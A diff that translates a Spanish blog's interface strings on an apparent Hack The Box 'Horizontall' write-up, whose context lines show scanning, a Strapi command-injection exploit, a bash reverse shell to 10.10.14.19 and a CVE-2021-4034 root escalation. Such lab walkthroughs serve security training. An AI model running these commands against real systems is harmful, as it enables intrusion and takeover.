@@ -194,7 +194,7 @@ if (!doNotTrack) {
   <div id="the-top" class="absolute flex self-center">
     <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
       href="#main-content"><span
-        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Ir al contenido</a>
   </div>
   
   
@@ -692,7 +692,7 @@ if (!doNotTrack) {
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2022-11-22 00:00:00 &#43;0000 UTC">22/11/2022</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+  <time datetime="2022-11-22 00:00:00 &#43;0000 UTC">22/11/2022</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">6 mins</span>
   
 
   
@@ -814,7 +814,7 @@ if (!doNotTrack) {
         <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
   <summary
     class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
-    Table of Contents
+    Tabla de contenido
   </summary>
   <div
     class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
@@ -852,7 +852,7 @@ if (!doNotTrack) {
 <details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
   <summary
     class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
-    Table of Contents
+    Tabla de contenido
   </summary>
   <div
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
@@ -902,7 +902,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#reconocimiento" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#reconocimiento" aria-label="Ancla">#</a></span>        
     
 </h2><p><strong>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</strong></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ping -c <span class="m">1</span> 10.10.11.105
@@ -942,7 +942,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#escaneo-de-puertos-nmap" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#escaneo-de-puertos-nmap" aria-label="Ancla">#</a></span>        
     
 </h3><p>Ahora empezamos con un escaneo de puertos</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -p- --open -sS --min-rate <span class="m">5000</span> -n -vvv -Pn 10.10.11.105 -oG allPorts
@@ -1110,7 +1110,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#contenido-web" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#contenido-web" aria-label="Ancla">#</a></span>        
     
 </h3><p>Al entrar a la web lo primero que se ve es una página en la cual no funcionan los links</p>
 <p>
@@ -1146,7 +1146,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#buscar-subdirectorios-wfuzz" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#buscar-subdirectorios-wfuzz" aria-label="Ancla">#</a></span>        
     
 </h3><p>Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code> con el siguiente comando:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
@@ -1218,7 +1218,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#buscar-subdominios-gobuster" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#buscar-subdominios-gobuster" aria-label="Ancla">#</a></span>        
     
 </h3><p>Con gobuster podemos buscar subdominios con el siguiente comando</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t <span class="m">50</span> -u horizontall.htb
@@ -1347,7 +1347,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#buscar-subdirectorios-wfuzz-1" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#buscar-subdirectorios-wfuzz-1" aria-label="Ancla">#</a></span>        
     
 </h3><p>Para encontrar subdirectorios vamos a usar la misma herramienta que antes, wfuzz</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ
@@ -1420,7 +1420,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#contenido-subdirectorios" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#contenido-subdirectorios" aria-label="Ancla">#</a></span>        
     
 </h3><p>Probamos a entrar en reviews y vemos lo siguiente:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[{</span><span class="s2">&#34;id&#34;</span>:1,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;wail&#34;</span>,<span class="s2">&#34;description&#34;</span>:<span class="s2">&#34;This is good service&#34;</span>,<span class="s2">&#34;stars&#34;</span>:4,<span class="s2">&#34;created_at&#34;</span>:<span class="s2">&#34;2021-05-29T13:23:38.000Z&#34;</span>,<span class="s2">&#34;updated_at&#34;</span>:<span class="s2">&#34;2021-05-29T13:23:38.000Z&#34;</span><span class="o">}</span>,
@@ -1469,7 +1469,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#buscar-subdirectorios-sobre-admin-wfuzz" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#buscar-subdirectorios-sobre-admin-wfuzz" aria-label="Ancla">#</a></span>        
     
 </h3><p>Para ver si hay más subdirectorios en /admin/ volvemos a usar wfuzz pero ahora sobre el directorio admin</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> --hh<span class="o">=</span><span class="m">854</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/admin/FUZZ
@@ -1525,7 +1525,7 @@ if (!doNotTrack) {
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#buscar-posible-vulnerabilidad-searchsploit" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#buscar-posible-vulnerabilidad-searchsploit" aria-label="Ancla">#</a></span>        
     
 </h3><p>Ahora tenemos la versión de strapi y con el comando searchsploit se puede buscar si es vulnerable: <code>searchsploit strapi 3.0.0-beta.17.4</code></p>
 <p>Nos muestra los siguientes exploits</p>
@@ -1543,7 +1543,7 @@ Shellcodes: No Results
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#explotaci%c3%b3n-de-vulnerabilidades" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#explotaci%c3%b3n-de-vulnerabilidades" aria-label="Ancla">#</a></span>        
     
 </h2><p>Ahora ya sabemos una vulnerabilidad (strapi), strapi es un CMS de código abierto basado en Node.js que te permite crear una API y gestionar su contenido</p>
 <p>De los 2 exploits que reporto el serachsploit vamos a usar el que está hecho con python, lo pasamos al directorio actual y después lo ejecutamos</p>
@@ -1553,7 +1553,7 @@ Shellcodes: No Results
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#ejecutar-exploit" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#ejecutar-exploit" aria-label="Ancla">#</a></span>        
     
 </h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">python3</span> <span class="mf">50239.</span><span class="n">py</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">api</span><span class="o">-</span><span class="n">prod</span><span class="o">.</span><span class="n">horizontall</span><span class="o">.</span><span class="n">htb</span>
 </code></pre></div><p>Eso nos va a abrir una inyección de comandos en la cual no podemos ver la respuesta.</p>
@@ -1562,7 +1562,7 @@ Shellcodes: No Results
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#reverse-shell" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#reverse-shell" aria-label="Ancla">#</a></span>        
     
 </h3><ol>
 <li>
@@ -1593,14 +1593,14 @@ bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.19/443 0&gt;<span cla
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#escalada-de-privilegios" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#escalada-de-privilegios" aria-label="Ancla">#</a></span>        
     
 </h2><div id="tratamiento-de-la-tty" class="anchor">Tratamiento de la tty></div>
 <h3 class="relative group">Tratamiento de la tty 
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#tratamiento-de-la-tty" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#tratamiento-de-la-tty" aria-label="Ancla">#</a></span>        
     
 </h3><p>Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">script /dev/null -c bash
@@ -1615,7 +1615,7 @@ bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.19/443 0&gt;<span cla
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#flag-usuario" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#flag-usuario" aria-label="Ancla">#</a></span>        
     
 </h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cat /home/developer/user.txt
 </code></pre></div><div id="flag-root" class="anchor">Flag Root></div>
@@ -1623,7 +1623,7 @@ bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.19/443 0&gt;<span cla
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#flag-root" aria-label="Anchor">#</a></span>        
+            style="text-decoration-line: none !important;" href="#flag-root" aria-label="Ancla">#</a></span>        
     
 </h3><p>Después de buscar un rato, he encontrado que es vulnerable a <a href="https://github.com/berdav/CVE-2021-4034"   target="_blank">
     https://github.com/berdav/CVE-2021-4034</a></p>
@@ -1681,8 +1681,8 @@ make
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
       href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://d3b0o.github.io/htb/horizontall/&amp;title=Resoluci%c3%b3n%20M%c3%a1quina%20Horizontall"
-      title="Share on LinkedIn"
-      aria-label="Share on LinkedIn"
+      title="Compartir en LinkedIn"
+      aria-label="Compartir en LinkedIn"
       >
       
 
@@ -1700,8 +1700,8 @@ make
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
       href="https://twitter.com/intent/tweet/?url=https://d3b0o.github.io/htb/horizontall/&amp;text=Resoluci%c3%b3n%20M%c3%a1quina%20Horizontall"
-      title="Tweet on Twitter"
-      aria-label="Tweet on Twitter"
+      title="Tuitear en Twitter"
+      aria-label="Tuitear en Twitter"
       >
       
 
@@ -1719,8 +1719,8 @@ make
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
       href="https://reddit.com/submit/?url=https://d3b0o.github.io/htb/horizontall/&amp;resubmit=true&amp;title=Resoluci%c3%b3n%20M%c3%a1quina%20Horizontall"
-      title="Submit to Reddit"
-      aria-label="Submit to Reddit"
+      title="Publicar en Reddit"
+      aria-label="Publicar en Reddit"
       >
       
 
@@ -1740,8 +1740,8 @@ make
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
       href="https://www.facebook.com/sharer/sharer.php?u=https://d3b0o.github.io/htb/horizontall/&amp;quote=Resoluci%c3%b3n%20M%c3%a1quina%20Horizontall"
-      title="Share on Facebook"
-      aria-label="Share on Facebook"
+      title="Compartir en Facebook"
+      aria-label="Compartir en Facebook"
       >
       
 
@@ -1796,7 +1796,7 @@ make
     <p class="text-xs text-neutral-500 dark:text-neutral-400">
       
       
-      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+      Desarrollada con <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
         href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
         href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
     </p>
@@ -1843,14 +1843,14 @@ make
           type="search"
           id="search-query"
           class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
-          placeholder="Search"
+          placeholder="Buscar"
           tabindex="0"
         />
       </form>
       <button
         id="close-search-button"
         class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
-        title="Close (Esc)"
+        title="Cerrar (Esc)"
       >
         
 
